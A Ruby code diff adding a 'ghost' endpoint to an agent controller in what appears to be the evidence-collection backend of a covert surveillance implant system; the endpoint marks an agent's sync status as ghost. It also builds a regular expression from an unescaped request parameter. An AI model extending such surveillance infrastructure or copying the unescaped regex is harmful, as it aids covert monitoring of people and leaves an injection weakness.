@@ -630,6 +630,27 @@ class AgentController < RESTController
     end
   end
 
+  def ghost
+    require_auth_level :server
+
+    ident, instance = @params['_id'].split('-')
+
+    mongoid_query do
+      agent = Item.where({_kind: 'agent', ident: ident, instance: Regexp.new(instance.prepend('^'))}).first
+
+      trace :info, "[#{@request[:peer]}] Ghost Agent request for #{agent.ident} #{agent.instance}"
+
+      # update the stats
+      agent.stat[:last_sync] = Time.now.getutc.to_i
+      agent.stat[:last_sync_status] = RCS::DB::EvidenceManager::SYNC_GHOST
+      agent.stat[:ghost] = true
+      agent.save
+    end
+
+    return not_found()
+  end
+
+
 end
 
 end #DB::
